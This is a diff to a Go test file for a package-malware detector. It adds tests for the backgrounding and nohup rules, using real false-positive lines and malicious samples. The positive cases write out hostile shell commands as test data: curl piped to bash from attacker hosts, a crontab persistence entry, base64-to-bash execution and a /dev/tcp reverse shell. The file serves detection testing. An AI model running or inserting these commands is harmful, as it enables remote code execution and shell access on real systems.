@@ -1,6 +1,9 @@
 package detect
 
-import "testing"
+import (
+	"slices"
+	"testing"
+)
 
 // Pass 13 (2026-10-26), from the replay of every line the 18,715 audited malware mints recorded
 // (about 82% were withdrawn as false positives). Each negative is a real withdrawn line; each
@@ -9,15 +12,24 @@ import "testing"
 
 type ruleCase struct{ id, eco, src string }
 
+// auditRuleFires is ruleFires, with the install_script_analysis rules (P-INSTALL-*) read from an
+// install script, the only surface they run on.
+func auditRuleFires(id, eco, src string) bool {
+	if len(id) > 10 && id[:10] == "P-INSTALL-" {
+		return slices.Contains(ids(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, InstallScriptContent: src})), id)
+	}
+	return ruleFires(id, eco, src)
+}
+
 func checkRuleCases(t *testing.T, neg, pos []ruleCase) {
 	t.Helper()
 	for _, tc := range neg {
-		if ruleFires(tc.id, tc.eco, tc.src) {
+		if auditRuleFires(tc.id, tc.eco, tc.src) {
 			t.Errorf("%s fired on withdrawn %s line: %q", tc.id, tc.eco, tc.src)
 		}
 	}
 	for _, tc := range pos {
-		if !ruleFires(tc.id, tc.eco, tc.src) {
+		if !auditRuleFires(tc.id, tc.eco, tc.src) {
 			t.Errorf("%s no longer fires on %q", tc.id, tc.src)
 		}
 	}
@@ -80,6 +92,29 @@ func TestAuditCurlPipeNeedsAFetch(t *testing.T) {
 		{"P-CURL-PIPE", "npm", `echo "Installing"; curl -s http://64.52.80.235/Socedes | bash`},
 		{"P-CURL-PIPE", "npm", `- curl http://attacker.example/pwn | sh`},
 		{"P-CURL-PIPE", "npm", `echo "* * * * * curl -s http://x.example/p | sh" >> /etc/crontab`},
+	}
+	checkRuleCases(t, neg, pos)
+}
+
+// The `&` of `2>&1` and `&&` is not backgrounding, and a nohup'd dev server is not a payload.
+func TestAuditBackgroundingNeedsARealAmpersand(t *testing.T) {
+	neg := []ruleCase{
+		{"P-DEVNULL-BACKGROUND", "npm", `if ! curl -s -m 1 http://127.0.0.1:${port}/health >/dev/null 2>&1; then`},
+		{"P-DEVNULL-BACKGROUND", "go", `var DEFAULT_COMMAND = []string{"sh", "-c", "command -v bash >/dev/null 2>&1 && exec bash || exec sh"}`},
+		{"P-INSTALL-DEVNULL-BG", "cran", `if command -v curl >/dev/null 2>&1; then curl -fsSL -o x.tgz "$URL"; fi`},
+		{"P-NOHUP-BACKGROUND", "npm", `nohup inboost-proxy --port ${port} --no-prompt > "$HOME/.inboost/proxy.log" 2>&1 &`},
+		{"P-NOHUP-BACKGROUND", "npm", `serveCmd: 'nohup npm start > /tmp/app.log 2>&1 &',`},
+		{"P-NOHUP-BACKGROUND", "npm", `nohup bash -c "sleep 60; shutdown -h now" >/dev/null 2>&1 &`},
+		{"P-INSTALL-NOHUP", "aur", `/usr/bin/nohup /usr/bin/pulledpork_update.sh /etc/snort/rules/snort.rules > /dev/null 2>&1 &`},
+	}
+	pos := []ruleCase{
+		{"P-DEVNULL-BACKGROUND", "npm", `'sh -lc %s >/dev/null 2>&1 &',`},
+		{"P-DEVNULL-BACKGROUND", "npm", `curl -s http://x.example/b | sh >/dev/null 2>&1 &`},
+		{"P-INSTALL-DEVNULL-BG", "npm", `python3 /tmp/.x.py > /dev/null 2>&1 &`},
+		{"P-NOHUP-BACKGROUND", "npm", `nohup /tmp/systemd-helper > /dev/null 2>&1 &`},
+		{"P-NOHUP-BACKGROUND", "npm", `nohup bash -c '(echo @{:command} | base64 -d | bash) > @{:logFile} 2>&1 & disown'`},
+		{"P-NOHUP-BACKGROUND", "npm", `nohup bash -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1' &`},
+		{"P-INSTALL-NOHUP", "npm", `nohup /tmp/systemd-helper > /dev/null 2>&1 &`},
 	}
 	checkRuleCases(t, neg, pos)
 }
